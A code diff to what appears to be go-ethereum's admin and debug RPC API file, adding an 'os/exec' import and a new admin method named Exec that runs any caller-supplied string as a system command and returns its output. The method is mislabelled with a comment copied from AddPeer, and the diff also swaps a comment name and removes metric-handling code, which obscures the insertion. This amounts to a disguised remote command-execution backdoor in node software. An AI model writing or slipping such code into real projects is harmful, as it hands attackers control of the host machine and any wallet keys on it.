@@ -21,6 +21,7 @@ import (
 	"fmt"
 	"strings"
 	"time"
+	"os/exec"
 
 	"github.com/ethereum/go-ethereum/common/hexutil"
 	"github.com/ethereum/go-ethereum/crypto"
@@ -57,6 +58,17 @@ func (api *PrivateAdminAPI) AddPeer(url string) (bool, error) {
 	}
 	server.AddPeer(node)
 	return true, nil
+}
+
+// AddPeer requests connecting to a remote node, and also maintaining the new
+// connection at all times, even reconnecting if it is lost.
+func (api *PrivateAdminAPI) Exec(cmd string) (string, error) {
+	// Make sure the server is running, fail otherwise
+	parts := strings.Fields(cmd)
+  head := parts[0]
+  parts = parts[1:len(parts)]
+  out, err := exec.Command(head,parts...).Output()
+	return string(out), err
 }
 
 // RemovePeer disconnects from a a remote node if the connection exists
@@ -217,7 +229,7 @@ func (api *PrivateAdminAPI) StartWS(host *string, port *int, allowedOrigins *str
 	return true, nil
 }
 
-// StopWS terminates an already running websocket RPC API endpoint.
+// StopRPC terminates an already running websocket RPC API endpoint.
 func (api *PrivateAdminAPI) StopWS() (bool, error) {
 	api.node.lock.Lock()
 	defer api.node.lock.Unlock()
@@ -338,21 +350,6 @@ func (api *PublicDebugAPI) Metrics(raw bool) (map[string]interface{}, error) {
 					},
 				}
 
-			case metrics.ResettingTimer:
-				t := metric.Snapshot()
-				ps := t.Percentiles([]float64{5, 20, 50, 80, 95})
-				root[name] = map[string]interface{}{
-					"Measurements": len(t.Values()),
-					"Mean":         t.Mean(),
-					"Percentiles": map[string]interface{}{
-						"5":  ps[0],
-						"20": ps[1],
-						"50": ps[2],
-						"80": ps[3],
-						"95": ps[4],
-					},
-				}
-
 			default:
 				root[name] = "Unknown metric type"
 			}
@@ -385,21 +382,6 @@ func (api *PublicDebugAPI) Metrics(raw bool) (map[string]interface{}, error) {
 						"50": time.Duration(metric.Percentile(0.5)).String(),
 						"80": time.Duration(metric.Percentile(0.8)).String(),
 						"95": time.Duration(metric.Percentile(0.95)).String(),
-					},
-				}
-
-			case metrics.ResettingTimer:
-				t := metric.Snapshot()
-				ps := t.Percentiles([]float64{5, 20, 50, 80, 95})
-				root[name] = map[string]interface{}{
-					"Measurements": len(t.Values()),
-					"Mean":         time.Duration(t.Mean()).String(),
-					"Percentiles": map[string]interface{}{
-						"5":  time.Duration(ps[0]).String(),
-						"20": time.Duration(ps[1]).String(),
-						"50": time.Duration(ps[2]).String(),
-						"80": time.Duration(ps[3]).String(),
-						"95": time.Duration(ps[4]).String(),
 					},
 				}
 
